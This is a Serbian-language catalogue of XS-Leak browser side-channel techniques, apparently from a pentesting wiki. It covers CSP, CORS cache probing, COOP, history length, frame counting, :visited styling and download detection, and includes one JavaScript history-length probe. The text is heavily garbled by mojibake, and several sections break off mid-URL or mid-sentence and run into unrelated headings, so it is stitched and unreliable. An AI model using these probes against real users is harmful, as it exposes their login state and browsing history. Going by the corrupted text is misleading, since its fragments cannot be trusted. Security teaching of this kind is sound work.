### CSP ĞšÑ€ÑˆĞµÑšĞµ/ĞÑ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞµ

* **ĞœĞµÑ‚Ğ¾Ğ´Ğ¸ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: ĞŸĞ¾Ğ¿-ÑƒĞ¿Ğ¾Ğ²Ğ¸
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ¡Ñ‚Ğ°Ñ‚ÑƒÑĞ½Ğ¸ ĞºĞ¾Ğ´
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: ĞĞºĞ¾ Ñƒ CSP Ğ´Ğ¾Ğ·Ğ²Ğ¾Ğ»Ğ¸Ğ¼Ğ¾ ÑĞ°Ğ¼Ğ¾ ÑĞ°Ñ˜Ñ‚ Ğ¶Ñ€Ñ‚Ğ²Ğµ Ğ¸ Ğ°ĞºĞ¾ Ğ¿Ğ¾ĞºÑƒÑˆĞ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€Ğ¸Ñ‚Ğ¸ Ğ½Ğ° Ğ´Ñ€ÑƒĞ³Ğ¸ Ğ´Ğ¾Ğ¼ĞµĞ½, CSP Ñ›Ğµ Ğ¿Ğ¾ĞºÑ€ĞµĞ½ÑƒÑ‚Ğ¸ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞµ Ğ³Ñ€ĞµÑˆĞºĞµ.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞºĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak Ğ¼Ğ¾Ğ¶Ğµ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ CSP Ğ´Ğ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ˜Ğµ Ğ´Ğ° Ğ»Ğ¸ Ñ˜Ğµ ÑĞ°Ñ˜Ñ‚ ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½ Ğ½Ğ° Ğ´Ñ€ÑƒĞ³Ğ¸ Ğ¸Ğ·Ğ²Ğ¾Ñ€. ĞĞ²Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞµ, Ğ°Ğ»Ğ¸ Ğ´Ğ¾Ğ´Ğ°Ñ‚Ğ½Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ğ¸ Ğ´Ğ¾Ğ¼ĞµĞ½ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ°. ĞÑĞ½Ğ¾Ğ²Ğ½Ğ° Ğ¸Ğ´ĞµÑ˜Ğ° Ğ¾Ğ²Ğ¾Ğ³ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ° Ñ˜Ğµ **Ğ´Ğ¾Ğ·Ğ²Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ Ñ†Ğ¸Ñ™Ğ°Ğ½Ğ¸ Ğ´Ğ¾Ğ¼ĞµĞ½ Ğ½Ğ° Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡ĞºĞ¾Ğ¼ ÑĞ°Ñ˜Ñ‚Ñƒ**. ĞšĞ°Ğ´Ğ° ÑĞµ Ğ·Ğ°Ñ…Ñ‚ĞµĞ² Ğ¿Ğ¾ÑˆĞ°Ñ™Ğµ ĞºĞ° Ñ†Ğ¸Ñ™Ğ°Ğ½Ğ¾Ğ¼ Ğ´Ğ¾Ğ¼ĞµĞ½Ñƒ, Ğ¾Ğ½ ÑĞµ **Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€Ğ°Ğ²Ğ°** Ğ½Ğ° Ğ´Ğ¾Ğ¼ĞµĞ½ ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°. **CSP Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ°** Ğ¿Ñ€Ğ¸ÑÑ‚ÑƒĞ¿ ÑšĞµĞ¼Ñƒ Ğ¸ ĞºÑ€ĞµĞ¸Ñ€Ğ° **Ğ¸Ğ·Ğ²ĞµÑˆÑ‚Ğ°Ñ˜ Ğ¾ ĞºÑ€ÑˆĞµÑšÑƒ ĞºĞ¾Ñ˜Ğ¸ ÑĞµ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸ ĞºĞ°Ğ¾ Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞ°**. Ğ—Ğ°Ğ²Ğ¸ÑĞ½Ğ¾ Ğ¾Ğ´ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ°, **Ğ¾Ğ²Ğ°Ñ˜ Ğ¸Ğ·Ğ²ĞµÑˆÑ‚Ğ°Ñ˜ Ğ¼Ğ¾Ğ¶Ğµ Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ‚Ğ¸ Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ñ˜Ñƒ Ñ†Ğ¸Ñ™Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ°**.\
ĞœĞ¾Ğ´ĞµÑ€Ğ½Ğ¸ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ¸ Ğ½ĞµÑ›Ğµ Ğ¿Ñ€Ğ¸ĞºĞ°Ğ·Ğ°Ñ‚Ğ¸ URL Ğ½Ğ° ĞºĞ¾Ñ˜Ğ¸ Ñ˜Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½, Ğ°Ğ»Ğ¸ Ñ˜Ğ¾Ñˆ ÑƒĞ²ĞµĞº Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ‚Ğ¸ Ğ´Ğ° Ñ˜Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞµ ÑĞ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ° Ğ¿Ğ¾ĞºÑ€ĞµĞ½ÑƒÑ‚Ğ¾.

### ĞšĞµÑˆ

* **ĞœĞµÑ‚Ğ¾Ğ´Ğ¸ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Ğ¤Ñ€ĞµÑ˜Ğ¼Ğ¾Ğ²Ğ¸, ĞŸĞ¾Ğ¿-ÑƒĞ¿Ğ¾Ğ²Ğ¸
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ¡Ğ°Ğ´Ñ€Ğ¶Ğ°Ñ˜ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://
### CORB

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Rezime**: CORB moÅ¾e omoguÄ‡iti napadaÄima da otkriju kada je prisutno zaglavlje **`nosniff`** u zahtevu.
* **Primer koda**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Proverite link za viÅ¡e informacija o napadu.

### CORS greÅ¡ka na konfiguraciji odraza porekla <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Rezime**: Ako se zaglavlje Origin odraÅ¾ava u zaglavlju `Access-Control-Allow-Origin`, moguÄ‡e je proveriti da li je resurs veÄ‡ u keÅ¡u.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

U sluÄaju kada se zaglavlje **Origin** odraÅ¾ava u zaglavlju `Access-Control-Allow-Origin`, napadaÄ moÅ¾e iskoristiti ovaj postupak da pokuÅ¡a da **dobavi** resurs u **CORS** reÅ¾imu. Ako **nije izazvana greÅ¡ka**, to znaÄi da je resurs **ispravno preuzet sa veba**, a ako je izazvana greÅ¡ka, to znaÄi da je pristupljen iz keÅ¡a (greÅ¡ka se pojavljuje jer keÅ¡ Äuva odgovor sa CORS zaglavljem koje dozvoljava originalni domen, a ne domen napadaÄa).\
Imajte na umu da ako se poreklo ne odraÅ¾ava, ali se koristi dÅ¾oker (`Access-Control-Allow-Origin: *`), ovo neÄ‡e raditi.

## Tehnika Äitljivih atributa

### Preusmeravanje Fetch

* **Metode ukljuÄivanja**: Fetch API
* **Detektoviva razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Rezime**: GC i SA omoguÄ‡avaju proveru tipa odgovora (`opaque-redirect`) nakon zavrÅ¡etka preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Slanjem zahteva pomoÄ‡u Fetch API sa `redirect: "manual"` i drugim parametrima, moguÄ‡e je proÄitati atribut `response.type` i ako je jednak `opaqueredirect`, onda je odgovor bio preusmeravanje.

### COOP

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektoviva razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Rezime**: Stranice zaÅ¡tiÄ‡ene Cross-Origin Opener Policy (COOP) spreÄavaju pristup prekooriginarnih interakcija.
* **Primer koda**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

NapadaÄ je sposoban da zakljuÄi prisustvo zaglavlja Cross-Origin Opener Policy (COOP) u HTTP odgovoru prekooriginarnog porekla. COOP se koristi od strane veb aplikacija da bi se spreÄilo da spoljni sajtovi dobiju proizvoljne reference prozora. Vidljivost ovog zaglavlja moÅ¾e se uoÄiti pokuÅ¡ajem pristupa **`contentWindow` referenci**. U sluÄajevima kada se COOP primenjuje uslovno, svojstvo **`opener`** postaje pokazatelj: ono je **nedefinisano** kada je COOP aktivan, a **definisano** kada je COOP odsutan.

### Maksimalna duÅ¾ina URL-a - serverska strana

* **Metode ukljuÄivanja**: Fetch API, HTML elementi
* **Detektoviva razlika**: Statusni kod / SadrÅ¾aj
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Rezime**: Otkrivanje razlika u odgovorima zbog preusmeravanja, jer duÅ¾ina odgovora preusmeravanja moÅ¾e biti prevelika da bi server odgovorio greÅ¡kom i generisao upozorenje.
* **Primer koda**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ako serversko preusmeravanje koristi **korisniÄki unos unutar preusmeravanja** i **dodatne podatke**, moguÄ‡e je otkriti ovaj postupak jer serveri obiÄno imaju ograniÄenje duÅ¾ine zahteva. Ako je **korisniÄki podatak** duÅ¾ine **- 1**, jer se **preusmeravanje** koristi **tim podacima** i **dodaje** neÅ¡to **dodatno**, izazvaÄ‡e se **greÅ¡ka koja se moÅ¾e otkriti putem dogaÄ‘aja greÅ¡ke**.

Ako na neki naÄin moÅ¾ete postaviti kolaÄiÄ‡e korisniku, moÅ¾ete izvesti ovaj napad tako Å¡to Ä‡ete **postaviti dovoljno kolaÄiÄ‡a** ([**cookie bomba**](hacking-with-cookies/cookie-bomb.md)) tako da se sa **poveÄ‡anom veliÄinom odgovora** ispravnog odgovora izazove greÅ¡ka. U ovom sluÄaju, zapamtite da ako pokrenete ovaj zahtev sa istog sajta, `<script>` Ä‡e automatski poslati kolaÄiÄ‡e (tako da moÅ¾ete proveriti greÅ¡ke).\
Primer **cookie bombe + XS-Search** moÅ¾ete pronaÄ‡i u namerenoj reÅ¡enju ovog Älanka: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

ObiÄno je potrebno da `SameSite=None` ili da se nalazite u istom kontekstu za ovu vrstu napada.

### Maksimalna duÅ¾ina URL-a - klijentska strana

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektoviva razlika**: Statusni kod / SadrÅ¾aj
* **ViÅ¡e informacija**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unint
### Maksimalni broj preusmeravanja

* **Metode ukljuÄivanja**: Fetch API, okviri
* **Detektoviva razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Rezime**: Koristite ograniÄenje preusmeravanja pregledaÄa da biste utvrdili pojavu preusmeravanja URL-a.
* **Primer koda**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ako je **maksimalni broj preusmeravanja** koje pregledaÄ treba da prati **20**, napadaÄ moÅ¾e pokuÅ¡ati da uÄita svoju stranicu sa **19 preusmeravanja** i na kraju **preusmeri Å¾rtvu** na testiranu stranicu. Ako se izazove **greÅ¡ka**, to znaÄi da je stranica pokuÅ¡avala da **preusmeri Å¾rtvu**.

### DuÅ¾ina istorije

* **Metode ukljuÄivanja**: Okviri, iskaÄuÄ‡i prozori
* **Detektoviva razlika**: Preusmeravanja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Rezime**: JavaScript kod manipuliÅ¡e istorijom pregledaÄa i moÅ¾e se pristupiti preko svojstva duÅ¾ine.
* **Primer koda**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

API za istoriju omoguÄ‡ava JavaScript kodu da manipuliÅ¡e istorijom pregledaÄa, koja **Äuva posete koje je korisnik obavio**. NapadaÄ moÅ¾e koristiti svojstvo duÅ¾ine kao metodu ukljuÄivanja: da bi otkrio JavaScript i HTML navigaciju.\
**Provera `history.length`**, nateranje korisnika da **preÄ‘e** na stranicu, **vrati** je **nazad** na isti izvor i **provera** nove vrednosti **`history.length`**.

### DuÅ¾ina istorije sa istim URL-om

* **Metode ukljuÄivanja**: Okviri, iskaÄuÄ‡i prozori
* **Detektoviva razlika**: Ako je URL isti kao pretpostavljeni
* **Rezime**: MoguÄ‡e je pretpostaviti da li je lokacija okvira/iskaÄuÄ‡eg prozora na odreÄ‘enom URL-u zloupotrebom duÅ¾ine istorije.
* **Primer koda**: Ispod

NapadaÄ moÅ¾e koristiti JavaScript kod da **manipuliÅ¡e lokacijom okvira/iskaÄuÄ‡eg prozora na pretpostavljenom URL-u** i **odmah je promeni u `about:blank`**. Ako se duÅ¾ina istorije poveÄ‡a, to znaÄi da je URL bio taÄan i da je imao vremena da **se poveÄ‡a jer se URL ne uÄitava ponovo ako je isti**. Ako se nije poveÄ‡ala, to znaÄi da je **pokuÅ¡ao da uÄita pretpostavljeni URL**, ali zato Å¡to smo **odmah nakon toga** uÄitali **`about:blank`**, **duÅ¾ina istorije se nikada nije poveÄ‡ala** prilikom uÄitavanja pretpostavljenog URL-a.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Brojanje frejmova

* **Metode ukljuÄivanja**: Frejmovi, iskaÄuÄ‡i prozori
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Rezime**: Procenite koliÄinu elemenata iframe inspekcijom svojstva `window.length`.
* **Primer koda**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Brojanje **broja frejmova na vebu** otvorenih putem `iframe` ili `window.open` moÅ¾e pomoÄ‡i u identifikaciji **stanja korisnika na toj stranici**.\
Osim toga, ako stranica uvek ima isti broj frejmova, **kontinuirano** proveravanje broja frejmova moÅ¾e pomoÄ‡i u identifikaciji **uzorka** koji moÅ¾e otkriti informacije.

Primer ove tehnike je da se u Chrome-u **PDF** moÅ¾e **detektovati** pomoÄ‡u **brojanja frejmova** jer se interno koristi `embed`. Postoje [parametri otvaranja URL-a](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omoguÄ‡avaju odreÄ‘enu kontrolu nad sadrÅ¾ajem kao Å¡to su `zoom`, `view`, `page`, `toolbar`, gde bi ova tehnika mogla biti interesantna.

### HTMLElementi

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Rezime**: ProÄitajte procurelu vrednost da biste razlikovali izmeÄ‘u 2 moguÄ‡a stanja
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Curenje informacija putem HTML elemenata je zabrinjavajuÄ‡e u vezi sa bezbednoÅ¡Ä‡u veba, posebno kada se dinamiÄki generiÅ¡u medijski fajlovi na osnovu korisniÄkih informacija ili kada se dodaju vodeni Å¾igovi koji menjaju veliÄinu medija. NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e analizirati informacije koje izlaÅ¾u odreÄ‘eni HTML elementi kako bi razlikovali moguÄ‡a stanja.

### Informacije izloÅ¾ene HTML elementima

- **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, do kojih se moÅ¾e pristupiti putem njegovog API-ja.
[ProÄitajte viÅ¡e o HTMLMediaElement-u](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Otkriva `videoHeight` i `videoWidth`. U nekim pregledaÄima dostupna su dodatna svojstva poput `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` i `webkitDecodedFrameCount`, koja pruÅ¾aju detaljnije informacije o sadrÅ¾aju medija.
[ProÄitajte viÅ¡e o HTMLVideoElement-u](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Ova funkcija pruÅ¾a detalje o kvalitetu reprodukcije videa, ukljuÄujuÄ‡i `totalVideoFrames`, koji moÅ¾e ukazivati na koliÄinu obraÄ‘enih video podataka.
[ProÄitajte viÅ¡e o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Ovaj element otkriva `height` i `width` slike. MeÄ‘utim, ako je slika nevaÅ¾eÄ‡a, ove osobine Ä‡e vratiti 0, a funkcija `image.decode()` Ä‡e biti odbijena, Å¡to ukazuje na neuspeh uÄitavanja slike na odgovarajuÄ‡i naÄin.
[ProÄitajte viÅ¡e o HTMLImageElement-u](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### CSS svojstvo

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Rezime**: Identifikujte varijacije u stilizovanju veb sajta koje se odnose na korisnikovo stanje ili status.
* **Primer koda**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Veb aplikacije mogu menjati **stilizovanje veb sajta** u zavisnosti od stanja korisnika. CSS fajlovi sa razliÄitog porekla mogu biti ugraÄ‘eni na stranici napadaÄa pomoÄ‡u **HTML link elementa**, a **pravila** Ä‡e biti **primenjena** na stranicu napadaÄa. Ako stranica dinamiÄki menja ova pravila, napadaÄ moÅ¾e **detektovati** ove **razlike** u zavisnosti od stanja korisnika.\
Kao tehnika curenja, napadaÄ moÅ¾e koristiti metodu `window.getComputedStyle` da **proÄita CSS** svojstva odreÄ‘enog HTML elementa. Kao rezultat, napadaÄ moÅ¾e proÄitati proizvoljna CSS svojstva ako su poznati pogoÄ‘eni element i naziv svojstva.

### CSS istorija

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Rezime**: Detektujte da li je stil `:visited` primenjen na URL, Å¡to ukazuje da je veÄ‡ poseÄ‡en
* **Primer koda**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Prema [**ovome**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), ovo ne funkcioniÅ¡e u headless Chrome-u.
{% endhint %}

CSS selektor `:visited` se koristi za stilizovanje URL-ova na drugaÄiji naÄin ako ih je korisnik prethodno posetio. Ranije se metoda `getComputedStyle()` mogla koristiti za identifikaciju ovih stilskih razlika. MeÄ‘utim, moderni pregledaÄi su implementirali sigurnosne mere kako bi spreÄili da ova metoda otkrije stanje veze. Ove mere ukljuÄuju uvek vraÄ‡anje izraÄunatog stila kao da je veza poseÄ‡ena i ograniÄavanje stilova koji se mogu primeniti sa selektorom `:visited`.

Uprkos ovim ograniÄenjima, moguÄ‡e je indirektno uoÄiti poseÄ‡eno stanje veze. Jedna tehnika ukljuÄuje prevaru korisnika da interaguje sa podruÄjem koje je pogoÄ‘eno CSS-om, posebno koriÅ¡Ä‡enjem svojstva `mix-blend-mode`. Ovo svojstvo omoguÄ‡ava meÅ¡anje elemenata sa njihovom pozadinom, Å¡to potencijalno otkriva poseÄ‡eno stanje na osnovu interakcije korisnika.

Osim toga, detekcija se moÅ¾e postiÄ‡i bez interakcije korisnika iskoriÅ¡Ä‡avanjem vremena renderovanja veza. BuduÄ‡i da pregledaÄi mogu razliÄito renderovati poseÄ‡ene i neposeÄ‡ene veze, to moÅ¾e uvesti merljivu vremensku razliku u renderovanju. U izveÅ¡taju o bagu Chromium-a pomenut je dokazni koncept (PoC) koji demonstrira ovu tehniku koriÅ¡Ä‡enjem viÅ¡e veza kako bi se pojaÄala vremenska razlika, Ä
### ContentDocument X-Frame Leak

* **Metode ukljuÄivanja**: Okviri
* **Detektoviva razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Rezime**: U Google Chrome-u, prikazuje se posebna stranica greÅ¡ke kada se blokira ugraÄ‘ivanje stranice na sajtu preko razliÄitog porekla zbog restrikcija X-Frame-Options.
* **Primer koda**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa zaglavljem `X-Frame-Options` postavljenim na "deny" ili "same-origin" ugraÄ‘ena kao objekat, prikazuje se stranica greÅ¡ke. Chrome jedinstveno vraÄ‡a prazan objekat dokumenta (umesto `null`) za svojstvo `contentDocument` ovog objekta, za razliku od iframe-ova ili drugih pregledaÄa. NapadaÄi mogu iskoristiti ovo otkrivanjem praznog dokumenta, Å¡to potencijalno otkriva informacije o stanju korisnika, posebno ako programeri nekonzistentno postavljaju zaglavlje X-Frame-Options, Äesto zanemarujuÄ‡i stranice greÅ¡ke. Svest i dosledna primena sigurnosnih zaglavlja su kljuÄne za spreÄavanje takvih curenja informacija.


### Otkrivanje preuzimanja

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektoviva razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Rezime**: NapadaÄ moÅ¾e otkriti preuzimanje datoteka iskoriÅ¡Ä‡avanjem iframe-ova; nastavak pristupa iframe-u implicira uspeÅ¡no preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Zaglavlje `Content-Disposition`, posebno `Content-Disposition: attachment`, instrukcira pregledaÄ da preuzme sadrÅ¾aj umesto da ga prikaÅ¾e ugraÄ‘eno. Ovo ponaÅ¡anje moÅ¾e biti iskoriÅ¡Ä‡eno za otkrivanje da li korisnik ima pristup stranici koja pokreÄ‡e preuzimanje datoteke. U pregledaÄima zasnovanim na Chromium-u, postoje neke tehnike za otkrivanje ovog ponaÅ¡anja preuzimanja:

1. **Pratiti traku preuzimanja**:
- Kada se datoteka preuzme u pregledaÄima zasnovanim na Chromium-u, na dnu prozora pregledaÄa se prikazuje traka preuzimanja.
- PraÄ‡enjem promena u visini prozora, napadaÄi mogu zakljuÄiti pojavu trake preuzimanja, Å¡to ukazuje na pokretanje preuzimanja.

2. **Navigacija preuzimanja sa iframe-ovima**:
- Kada stranica pokrene preuzimanje datoteke koristeÄ‡i zaglavlje `Content-Disposition: attachment`, to ne izaziva dogaÄ‘aj navigacije.
- UÄitavanjem sadrÅ¾aja u iframe-u i praÄ‡enjem dogaÄ‘aja navigacije, moguÄ‡e je proveriti da li raspored sadrÅ¾aja izaziva preuzimanje datoteke (bez navigacije) ili ne.

3. **Navigacija preuzimanja bez iframe-ova**:
- SliÄno kao i tehnika sa iframe-ovima, ova metoda ukljuÄuje koriÅ¡Ä‡enje `window.open` umesto iframe-a.
- PraÄ‡enjem dogaÄ‘aja navigacije u novo otvorenom prozoru moÅ¾e se otkriti da li je pokrenuto preuzimanje datoteke (bez navigacije) ili se sadrÅ¾aj prikazuje ugraÄ‘eno (nastupa navigacija).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti za indirektno zakljuÄivanje autentifikacionog stanja korisnika na osnovu odgovora pregledaÄa na zahtev za preuzimanje.

